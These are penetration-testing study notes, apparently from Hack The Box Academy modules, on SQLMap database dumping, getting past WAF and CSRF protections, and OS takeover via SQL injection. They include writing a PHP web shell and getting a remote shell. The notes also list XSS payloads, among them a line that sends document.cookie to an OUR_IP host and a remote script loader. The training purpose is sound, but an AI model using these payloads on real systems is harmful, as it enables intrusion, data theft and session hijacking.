	> Usually, after a successful detection of an SQLi vulnerability, we can begin the enumeration of basic details from the database, such as the hostname of the vulnerable target (--hostname), current user's name (--current-user), current database name (--current-db), or password hashes (--passwords). SQLMap will skip SQLi detection if it has been identified earlier and directly start the DBMS enumeration process.
	> Enumeration usually starts with the retrieval of the basic information:
    		- Database version banner (switch --banner)
    		- Current user name (switch --current-user)
    		- Current database name (switch --current-db)
    		- Checking if the current user has DBA (administrator) rights.

	> The following SQLMap command does all of the above:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
	> From the above example, we can see that the database version is quite old (MySQL 5.1.41 - from November 2009), and the current user name is root, while the current database name is testdb.

	> Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.

* Table Enumeration
	> In most common scenarios, after finding the current database name (i.e. testdb), the retrieval of table names would be by using the --tables option and specifying the DB name with -D testdb, is as follows:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
	> After spotting the table name of interest, retrieval of its content can be done by using the --dump option and specifying the table name with -T users, as follows:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
	> The console output shows that the table is dumped in formatted CSV format to a local file, users.csv.
	> Tip: Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.

* Table/Row Enumeration
	> When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only name and surname columns) with the -C option, as follows:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
	> To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the --start and --stop options (e.g., start from 2nd up to 3rd entry), as follows:
		> m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

* Conditional Enumeration
	> If there is a requirement to retrieve certain rows based on a known WHERE condition (e.g. name LIKE 'f%'), we can use the option --where, as follows:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

* Full DB Enumeration
	> Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option -T altogether (e.g. --dump -D testdb). By simply using the switch --dump without specifying a table with -T, all of the current database content will be retrieved. As for the --dump-all switch, all the content from all the databases will be retrieved.
	> In such cases, a user is also advised to include the switch --exclude-sysdbs (e.g. --dump-all --exclude-sysdbs), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.

[+] Advanced Database Enumeration
	> Now that we have covered the basics of database enumeration with SQLMap, we will cover more advanced techniques to enumerate data of interest further in this section.

* DB Schema Enumeration
	> If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch --schema:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema

* Searching for Data
	> When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the --search option. This option enables us to search for identifier names by using the LIKE operator. For example, if we are looking for all of the table names containing the keyword user, we can run SQLMap as follows:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
	> In the above example, we can immediately spot a couple of interesting data retrieval targets based on these search results. We could also have tried to search for all column names based on a specific keyword (e.g. pass):
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass

* Password Enumeration and Cracking
	> Once we identify a table containing passwords (e.g. master.users), we can retrieve that table with the -T option, as previously shown:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
	> We can see in the previous example that SQLMap has automatic password hashes cracking capabilities. Upon retrieving any value that resembles a known hash format, SQLMap prompts us to perform a dictionary-based attack on the found hashes.
	> Hash cracking attacks are performed in a multi-processing manner, based on the number of cores available on the user's computer. Currently, there is an implemented support for cracking 31 different types of hash algorithms, with an included dictionary containing 1.4 million entries (compiled over the years with most common entries appearing in publicly available password leaks). Thus, if a password hash is not randomly chosen, there is a good probability that SQLMap will automatically crack it.

* DB Users Password Enumeration and Cracking
	> Apart from user credentials found in DB tables, we can also attempt to dump the content of system tables containing database-specific credentials (e.g., connection credentials). To ease the whole process, SQLMap has a special switch --passwords designed especially for such a task:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
	> Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.
	> This basically means that everything accessible will be retrieved, potentially running for a very long time. We will need to find the data of interest in the output files manually.




-=-=
[+] Bypassing Web Application Protections
	> There won't be any protection(s) deployed on the target side in an ideal scenario, thus not preventing automatic exploitation. Otherwise, we can expect problems when running an automated tool of any kind against such a target. Nevertheless, many mechanisms are incorporated into SQLMap, which can help us successfully bypass such protections.

* Anti-CSRF Token Bypass
	> One of the first lines of defense against the usage of automation tools is the incorporation of anti-CSRF (i.e., Cross-Site Request Forgery) tokens into all HTTP requests, especially those generated as a result of web-form filling.
	> In most basic terms, each HTTP request in such a scenario should have a (valid) token value available only if the user actually visited and used the page. While the original idea was the prevention of scenarios with malicious links, where just opening these links would have undesired consequences for unaware logged-in users (e.g., open administrator pages and add a new user with predefined credentials), this security feature also inadvertently hardened the applications against the (unwanted) automation.
	> Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is --csrf-token. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.
	> Additionally, even in a case where the user does not explicitly specify the token's name via --csrf-token, if one of the provided parameters contains any of the common infixes (i.e. csrf, xsrf, token), the user will be prompted whether to update it in further requests:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

* Unique Value Bypass
	> In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option --randomize should be used, pointing to the parameter name containing a value which should be randomized before being sent:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI

* Calculated Parameter Bypass
	> Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one. To bypass this, the option --eval should be used, where a valid Python code is being evaluated just before the request is being sent to the target:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI


* IP Address Concealing
	> In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option --proxy (e.g. --proxy="socks4://177.39.187.70:33283"), where we should add a working proxy.
	> In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option --proxy-file. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a SOCKS4 proxy service at the local port 9050 or 9150. By using switch --tor, SQLMap will automatically try to find the local port and use it appropriately.
	> If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch --check-tor. In such cases, SQLMap will connect to the https://check.torproject.org/ and check the response for the intended result (i.e., Congratulations appears inside).

* WAF Bypass
	> Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. ?pfov=...) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a 406 - Not Acceptable response after such a request.
	> In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library identYwaf(https://github.com/stamparm/identYwaf), containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch --skip-waf.

* User-agent Blacklisting Bypass
	> In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. User-agent: sqlmap/1.4.9 (http://sqlmap.org)).
	> This is trivial to bypass with the switch --random-agent, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.
	> Note: If some form of protection is detected during the run, we can expect problems with the target, even other security mechanisms. The main reason is the continuous development and new improvements in such protections, leaving smaller and smaller maneuver space for attackers.

* Tamper Scripts
	> Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.
	> For example, one of the most popular tamper scripts between(https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) is replacing all occurrences of greater than operator (>) with NOT BETWEEN 0 AND #, and the equals operator (=) with BETWEEN # AND #. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.
	> Tamper scripts can be chained, one after another, within the --tamper option (e.g. --tamper=between,randomcase), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull => https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte => https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py).
	> Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:

		Tamper-Script 			Description
		0eunion 			Replaces instances of UNION with e0UNION
		base64encode 			Base64-encodes all characters in a given payload
		between 			Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #
		commalesslimit 			Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart
		equaltolike 			Replaces all occurrences of operator equal (=) with LIKE counterpart
		halfversionedmorekeywords 	Adds (MySQL) versioned comment before each keyword
		modsecurityversioned 		Embraces complete query with (MySQL) versioned comment
		modsecurityzeroversioned 	Embraces complete query with (MySQL) zero-versioned comment
		percentage 			Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)
		plus2concat 			Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart
		randomcase 			Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
		space2comment 			Replaces space character ( ) with comments `/
		space2dash 			Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)
		space2hash 			Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)
		space2mssqlblank 		Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters
		space2plus 			Replaces space character ( ) with plus (+)
		space2randomblank 		Replaces space character ( ) with a random blank character from a valid set of alternate characters
		symboliclogical 		Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
		versionedkeywords 		Encloses each non-function keyword with (MySQL) versioned comment
		versionedmorekeywords 		Encloses each keyword with (MySQL) versioned comment

	> To get a whole list of implemented tamper scripts, along with the description as above, switch --list-tampers can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.

* Miscellaneous Bypasses
	> Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the Chunked transfer encoding, turned on using the switch --chunked, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.
	> The other bypass mechanisms is the HTTP parameter pollution (HPP), where payloads are split in a similar way as in case of --chunked between different same parameter named values (e.g. ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).


[+] OS Exploitation
	> SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS. SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.

* File Read/Write
	> The first part of OS Exploitation through an SQL Injection vulnerability is reading and writing data on the hosting server. Reading data is much more common than writing data, which is strictly privileged in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySql, to read local files, the DB user must have the privilege to LOAD DATA and INSERT, to be able to load the content of a file to a table and then reading that table.
	> An example of such a command is:
    		LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
	> While we do not necessarily need to have database administrator privileges (DBA) to read data, this is becoming more common in modern DBMSes. The same applies to other common databases. Still, if we do have DBA privileges, then it is much more probable that we have file-read privileges.

* Checking for DBA Privileges
	> To check whether we have DBA privileges with SQLMap, we can use the --is-dba option:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
			current user is DBA: False

	> As we can see, if we test that on one of the previous exercises, we get current user is DBA: False, meaning that we do not have DBA access. If we tried to read a file using SQLMap, we would get something like:
		[17:31:43] [INFO] fetching file: '/etc/passwd'
		[17:31:43] [ERROR] no data retrieved

	> To test OS exploitation, let's try an exercise in which we do have DBA privileges, as seen in the questions at the end of this section:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba
			current user is DBA: True
	> We see that this time we get current user is DBA: True, meaning that we may have the privilege to read local files.

* Reading Local Files
	> Instead of manually injecting the above line through SQLi, SQLMap makes it relatively easy to read local files with the --file-read option:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

	> As we can see, SQLMap said files saved to a local file. We can cat the local file to see its content:
		m1l0js@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
			root:x:0:0:root:/root:/bin/bash
			daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
			bin:x:2:2:bin:/bin:/usr/sbin/nologin
			...SNIP...
	> We have successfully retrieved the remote file.

* Writing Local Files
	> When it comes it writing files to the hosting server, it becomes much more restricted in modern DMBSes, since we can utilize this to write a Web Shell on the remote server, and hence get code execution and take over the server.
	> This is why modern DBMSes disable file-write by default and need certain privileges for DBA's to be able to write files. For example, in MySql, the --secure-file-priv configuration must be manually disabled to allow writing data into local files using the INTO OUTFILE SQL query, in addition to any local access needed on the host server, like the privilege to write in the directory we need.
	> Still, many web applications require the ability for DBMSes to write data into files, so it is worth testing whether we can write files to the remote server. To do that with SQLMap, we can use the --file-write and --file-dest options. First, let's prepare a basic PHP web shell and write it into a shell.php file:
		m1l0js@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
	> Now, let's attempt to write this file on the remote server, in the /var/www/html/ directory, the default server webroot for Apache. If we didn't know the server webroot, we will see how SQLMap can automatically find it.
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
	> We see that SQLMap confirmed that the file was indeed written:
	> Now, we can attempt to access the remote PHP shell, and execute a sample command:
		m1l0js@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la
			-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
	> We see that our PHP shell was indeed written on the remote server, and that we do have command execution over the host server.

* OS Command Execution
	> Now that we confirmed that we could write a PHP shell to get command execution, we can test SQLMap's ability to give us an easy OS shell without manually writing a remote shell. SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, like writing a remote shell, as we just did, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS command, like xp_cmdshell in Microsoft SQL Server. To get an OS shell with SQLMap, we can use the --os-shell option, as follows:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell

	> We see that SQLMap defaulted to UNION technique to get an OS shell, but eventually failed to give us any output No output. So, as we already know we have multiple types of SQL injection vulnerabilities, let's try to specify another technique that has a better chance of giving us direct output, like the Error-based SQL Injection, which we can specify with --technique=E:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E

	> As we can see, this time SQLMap successfully dropped us into an easy interactive remote shell, giving us easy remote code execution through this SQLi.
	> Note: SQLMap first asked us for the type of language used on this remote server, which we know is PHP. Then it asked us for the server web root directory, and we asked SQLMap to automatically find it using 'common location(s)'. Both of these options are the default options, and would have been automatically chosen if we added the '--batch' option to SQLMap.
	> With this, we have covered all of the main functionality of SQLMap.


-=-=-==--=-=-=-=-=-=-==
##Cross-Site Scripting(XSS)

## Commands

| Code | Description |
| ----- | ----- |
| **XSS Payloads** |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
| **Commands** |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80 ` | Start `PHP` server |

* Introduction
	> As web applications become more advanced and more common, so do web application vulnerabilities. Among the most common types of web application vulnerabilities are Cross-Site Scripting (XSS => https://owasp.org/www-community/attacks/xss/) vulnerabilities. XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks.

* What is XSS
	> A typical web application works by receiving the HTML code from the back-end server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra JavaScript code in an input field (e.g., comment/reply), so once another user views the same page, they unknowingly execute the malicious JavaScript code.
	> XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (low impact + high probability = medium risk), which we should always attempt to reduce risk by detecting, remediating, and proactively preventing these types of vulnerabilities. => (https://academy.hackthebox.com/storage/modules/103/xss_risk_chart_1.jpg)

* XSS Attacks
	> XSS vulnerabilities can facilitate a wide range of attacks, which can be anything that can be executed through browser JavaScript code. A basic example of an XSS attack is having the target user unwittingly send their session cookie to the attacker's web server. Another example is having the target's browser execute API calls that lead to a malicious action, like changing the user's password to a password of the attacker's choosing. There are many other types of XSS attacks, from Bitcoin mining to displaying ads.
	> As XSS attacks execute JavaScript code within the browser, they are limited to the browser's JS engine (i.e., V8 in Chrome). They cannot execute system-wide JavaScript code to do something like system-level code execution. In modern browsers, they are also limited to the same domain of the vulnerable website. Nevertheless, being able to execute JavaScript in a user's browser may still lead to a wide variety of attacks, as mentioned above. In addition to this, if a skilled researcher identifies a binary vulnerability in a web browser (e.g., a Heap overflow in Chrome), they can utilize an XSS vulnerability to execute a JavaScript exploit on the target's browser, which eventually breaks out of the browser's sandbox and executes code on the user's machine.
	> XSS vulnerabilities may be found in almost all modern web applications and have been actively exploited for the past two decades. A well-known XSS example is the Samy Worm, which was a browser-based worm that exploited a stored XSS vulnerability in the social networking website MySpace back in 2005. It executed when viewing an infected webpage by posting a message on the victim's MySpace page that read, "Samy is my hero." The message itself also contained the same JavaScript payload to re-post the same message when viewed by others. Within a single day, more than a million MySpace users had this message posted on their pages. Even though this specific payload did not do any actual harm, the vulnerability could have been utilized for much more nefarious purposes, like stealing users' credit card information, installing key loggers on their browsers, or even exploiting a binary vulnerability in user's web browsers (which was more common in web browsers back then).
	> In 2014, a security researcher accidentally identified an XSS vulnerability in Twitter's TweetDeck dashboard. This vulnerability was exploited to create a self-retweeting tweet in Twitter, which led the tweet to be retweeted more than 38,000 times in under two minutes. Eventually, it forced Twitter to temporarily shut down TweetDeck while they patched the vulnerability.
	> To this day, even the most prominent web applications have XSS vulnerabilities that can be exploited. Even Google's search engine page had multiple XSS vulnerabilities in its search bar, the most recent of which was in 2019 when an XSS vulnerability was found in the XML library. Furthermore, the Apache Server, the most commonly used web server on the internet, once reported an XSS Vulnerability that was being actively exploited to steal user passwords of certain companies. All of this tells us that XSS vulnerabilities should be taken seriously, and a good amount of effort should be put towards detecting and preventing them.

* Types of XSS
	> There are three main types of XSS vulnerabilities:
		- Stored (Persistent) XSS: The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
		- Reflected (Non-Persistent) XSS : Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)
		- DOM-based XSS: Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)

	> We will cover each of these types in the upcoming sections and work through exercises to see how each of them occurs, and then we will also see how each of them can be utilized in attacks.

-=-
[+] Stored XSS

	> Before we learn how to discover XSS vulnerabilities and utilize them for various attacks, we must first understand the different types of XSS vulnerabilities and their differences to know which to use in each kind of attack.
	> The first and most critical type of XSS vulnerability is Stored XSS or Persistent XSS. If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.
	> This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.
	> We can start the server below to view and practice a Stored XSS example. As we can see, the web page is a simple To-Do List app that we can add items to. We can try typing test and hitting enter/return to add a new item and see how the page handles it:
	> As we can see, our input was displayed on the page. If no sanitization or filtering was applied to our input, the page might be vulnerable to XSS.

* XSS Testing Payloads
	> We can test whether the page is vulnerable to XSS with the following basic XSS payload:
		<script>alert(window.origin)</script>
	> We use this payload as it is a very easy-to-spot method to know when our XSS payload has been successfully executed. Suppose the page allows any input and does not perform any sanitization on it. In that case, the alert should pop up with the URL of the page it is being executed on, directly after we input our payload or when we refresh the page:
	> As we can see, we did indeed get the alert, which means that the page is vulnerable to XSS, since our payload executed successfully. We can confirm this further by looking page source by clicking [CTRL+U] or right-clicking and selecting View Page Source, and we should see our payload in the page source:
		<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
		</ul></ul>

	> Tip: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.

	> As some modern browsers may block the alert() JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is <plaintext>, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is <script>print()</script> that will pop up the browser print dialog, which is unlikely to be blocked by any browsers. Try using these payloads to see how each works. You may use the reset button to remove any current payloads.
	> To see whether the payload is persistent and stored on the back-end, we can refresh the page and see whether we get the alert again. If we do, we would see that we keep getting the alert even throughout page refreshes, confirming that this is indeed a Stored/Persistent XSS vulnerability. This is not unique to us, as any user who visits the page will trigger the XSS payload and get the same alert.

[+] Reflected XSS
	> There are two types of Non-Persistent XSS vulnerabilities: Reflected XSS, which gets processed by the back-end server, and DOM-based XSS, which is completely processed on the client-side and never reaches the back-end server. Unlike Persistent XSS, Non-Persistent XSS vulnerabilities are temporary and are not persistent through page refreshes. Hence, our attacks only affect the targeted user and will not affect other users who visit the page.
	> Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized. There are many cases in which our entire input might get returned to us, like error messages or confirmation messages. In these cases, we may attempt using XSS payloads to see whether they execute. However, as these are usually temporary messages, once we move from the page, they would not execute again, and hence they are Non-Persistent.
	> We can start the server below to practice on a web page vulnerable to a Reflected XSS vulnerability. It is a similar To-Do List app to the one we practiced with in the previous section. We can try adding any test string to see how it's handled:
	> As we can see, we get Task 'test' could not be added., which includes our input test as part of the error message. If our input was not filtered or sanitized, the page might be vulnerable to XSS. We can try the same XSS payload we used in the previous section and click Add:
	> Once we click Add, we get the alert pop-up:
	> In this case, we see that the error message now says Task '' could not be added.. Since our payload is wrapped with a <script> tag, it does not get rendered by the browser, so we get empty single quotes '' instead. We can once again view the page source to confirm that the error message includes our XSS payload:
		<div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div></ul>
	> As we can see, the single quotes indeed contain our XSS payload '<script>alert(window.origin)</script>'.
	> If we visit the Reflected page again, the error message no longer appears, and our XSS payload is not executed, which means that this XSS vulnerability is indeed Non-Persistent.
	> But if the XSS vulnerability is Non-Persistent, how would we target victims with it?
	> This depends on which HTTP request is used to send our input to the server. We can check this through the Firefox Developer Tools by clicking [CTRL+I] and selecting the Network tab. Then, we can put our test payload again and click Add to send it:
	> As we can see, the first row shows that our request was a GET request. GET request sends their parameters and data as part of the URL. So, to target a user, we can send them a URL containing our payload. To get the URL, we can copy the URL from the URL bar in Firefox after sending our XSS payload, or we can right-click on the GET request in the Network tab and select Copy>Copy URL. Once the victim visits this URL, the XSS payload would execute:

[+] DOM XSS
	> The third and final type of XSS is another Non-Persistent type called DOM-based XSS. While reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).
	> We can run the server below to see an example of a web application vulnerable to DOM XSS. We can try adding a test item, and we see that the web application is similar to the To-Do List web applications we previously used:
	> However, if we open the Network tab in the Firefox Developer Tools, and re-add the test item, we would notice that no HTTP requests are being made:
	> We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end; hence it is a DOM-based XSS.
	> Furthermore, if we look at the page source by hitting [CTRL+I], we will notice that our test string is nowhere to be found. This is because the JavaScript code is updating the page when we click the Add button, which is after the page source is retrieved by our browser, hence the base page source will not show our input, and if we refresh the page, it will not be retained (i.e. Non-Persistent). We can still view the rendered page source with the Web Inspector tool by clicking [CTRL+SHIFT+C]:
* Source & Sink
	> To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the Source and Sink of the object displayed on the page. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.
	> On the other hand, the Sink is the function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:
    		- document.write()
    		- DOM.innerHTML
    		- DOM.outerHTML

	> Furthermore, some of the jQuery library functions that write to DOM objects are:
    		- add()
    		- after()
    		- append()

	> If a Sink function writes the exact input without any sanitization (like the above functions), and no other means of sanitization were used, then we know that the page should be vulnerable to XSS.
	> We can look at the source code of the To-Do web application, and check script.js, and we will see that the Source is being taken from the task= parameter:
		var pos = document.URL.indexOf("task=");
		var task = document.URL.substring(pos + 5, document.URL.length);

	> Right below these lines, we see that the page uses the innerHTML function to write the task variable in the todo DOM:
		document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
	> So, we can see that we can control the input, and the output is not being sanitized, so this page should be vulnerable to DOM XSS.

* DOM Attacks
	> If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the innerHTML function does not allow the use of the <script> tags within it as a security feature. Still, there are many other XSS payloads we use that do not contain <script> tags, like the following XSS payload:
		<img src="" onerror=alert(window.origin)>

	> The above line creates a new HTML image object, which has a onerror attribute that can execute JavaScript code when the image is not found. So, as we provided an empty image link (""), our code should always get executed without having to use <script> tags: 
		http://SERVER_IP:PORT/#task=<img src=

	> To target a user with this DOM XSS vulnerability, we can once again copy the URL from the browser and share it with them, and once they visit it, the JavaScript code should execute. Both of these payloads are among the most basic XSS payloads. There are many instances where we may need to use various payloads depending on the security of the web application and the browser, which we will discuss in the next section.


[+] XSS Discovery
	> By now, we should have a good understanding of what an XSS vulnerability is, the three types of XSS, and how each type differs from the others. We should also understand how XSS works through injecting JavaScript code into the client-side page source, thus executing additional code, which we will later learn how to utilize to our advantage.
	> In this section, we will go through various ways of detecting XSS vulnerabilities within a web application. In web application vulnerabilities (and all vulnerabilities in general), detecting them can become as difficult as exploiting them. However, as XSS vulnerabilities are widespread, many tools can help us in detecting and identifying them.

* Automated Discovery
	> Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP) have various capabilities for detecting all three types of XSS vulnerabilities. These scanners usually do two types of scanning: A Passive Scan, which reviews client-side code for potential DOM-based vulnerabilities, and an Active Scan, which sends various types of payloads to attempt to trigger an XSS through payload injection in the page source.
	> While paid tools usually have a higher level of accuracy in detecting XSS vulnerabilities (especially when security bypasses are required), we can still find open-source tools that can assist us in identifying potential XSS vulnerabilities. Such tools usually work by identifying input fields in web pages, sending various types of XSS payloads, and then comparing the rendered page source to see if the same payload can be found in it, which may indicate a successful XSS injection. Still, this will not always be accurate, as sometimes, even if the same payload was injected, it might not lead to a successful execution due to various reasons, so we must always manually verify the XSS injection.
